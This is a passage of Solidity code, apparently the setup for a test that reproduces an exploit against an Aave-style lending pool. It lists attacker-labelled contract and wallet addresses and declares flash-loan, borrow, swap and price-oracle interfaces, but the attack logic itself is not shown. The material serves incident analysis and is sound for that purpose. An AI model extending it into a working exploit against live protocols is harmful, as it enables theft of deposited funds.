    address internal constant LendingPoolAddressesProvider = 0x091d52CacE1edc5527C99cDCFA6937C1635330E4;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_0DF5DF =
        0x0dF5dfd95966753f01cb80E76dc20EA958238C46;
    address internal constant attack_contract = 0x39519c027b503f40867548Fb0c890b11728faA8F;
    address internal constant rUSDCn = 0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55;
    address internal constant A_3FF5D7_E871 = 0x3fF5d74866984571CE6A67d17a014a0e438ee871;
    address internal constant A_44CADF_D0A4 = 0x44CaDF6E49895640D9De85ac01d97D44429Ad0A4;
    address internal constant DefaultReserveInterestRateStrategy = 0x4c39ec61956AED20A43D2c7912d1d31C7C32CeBE;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_724DC8 =
        0x724dc807b04555b71ed48a6896b6F41593b8C637;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_794A61 =
        0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant attacker_eoa = 0x826D5F4d8084980366f975e10db6C4Cf1f9dDE6D;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant FiatTokenV2_2 = 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3;
    address internal constant RKA = 0x8b194bEae1d3e0788A1a35173978001ACDFba668;
    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant ATOKEN_IMPL = 0xc0249d743a17ed44b4F9Ee611B51D26AB2E26444;
    address internal constant AaveOracle = 0xC0cE5De939aaD880b0bdDcf9aB5750a53EDa454b;
    address internal constant UniswapV3Pool = 0xC6962004f452bE9203591991D15f6b388e09E8D0;
    address internal constant attack_helper = 0xd8B591abA7E5eDAc39f544e5d365CD65705Ea8f3;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_F4B148 =
        0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1;
}

interface IAaveOracle {
    function getAssetPrice(address) external view returns (uint256);
}

interface IInitializableImmutableAdminUpgradeabilityProxy_0DF5DF {
    function UNDERLYING_ASSET_ADDRESS() external view returns (uint256);
}

interface IInitializableImmutableAdminUpgradeabilityProxy_794A61 {
    function flashLoan(
        address,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata,
        uint16
    ) external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_F4B148 {
    function borrow(address, uint256, uint256, uint16, address) external;
    function deposit(address, uint256, address, uint16) external;
    function flashLoan(
        address,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata,
        uint16
    ) external;
    function getAddressesProvider() external view returns (uint256);
    function getConfiguration(address) external view returns (uint256);
    function withdraw(address, uint256, address) external returns (uint256);
}

interface ILendingPoolAddressesProvider {
    function getPriceOracle() external view returns (uint256);
}

interface IUSDC {
    function decimals() external view returns (uint256);
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function token0() external view returns (uint256);
    function token1() external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function decimals() external view returns (uint256);
    function withdraw(uint256) external;
}

interface IrUSDCn {
    function UNDERLYING_ASSET_ADDRESS() external view returns (uint256);
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
